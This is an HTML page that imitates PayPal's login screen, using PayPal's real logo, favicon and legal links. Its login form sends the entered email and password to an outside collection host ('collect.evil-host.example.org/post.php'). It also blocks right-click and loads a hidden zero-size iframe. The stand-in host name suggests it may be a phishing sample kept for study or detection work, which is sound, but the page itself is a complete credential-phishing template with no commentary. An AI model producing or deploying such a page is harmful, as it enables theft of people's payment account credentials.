<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>PayPal: Log in to your account</title>
    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" />
    <link rel="stylesheet" href="https://cdn.other-host.net/pp.css" />
  </head>
  <body oncontextmenu="return false">
    <img src="https://www.paypalobjects.com/logo.svg" alt="PayPal" />
    <h1>Log in to your account</h1>
    <form action="https://collect.evil-host.example.org/post.php" method="post">
      <input type="email" name="email" placeholder="Email" />
      <input type="password" name="pass" placeholder="Password" />
      <input type="hidden" name="token" value="x" />
      <input type="submit" value="Log In" />
    </form>
    <a href="#">Having trouble logging in?</a>
    <a href="javascript:void(0)">Sign Up</a>
    <a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full">Privacy</a>
    <a href="https://www.paypal.com/us/webapps/mpp/ua/legalhub-full">Legal</a>
    <iframe src="/track" width="0" height="0" style="display:none"></iframe>
  </body>
</html>
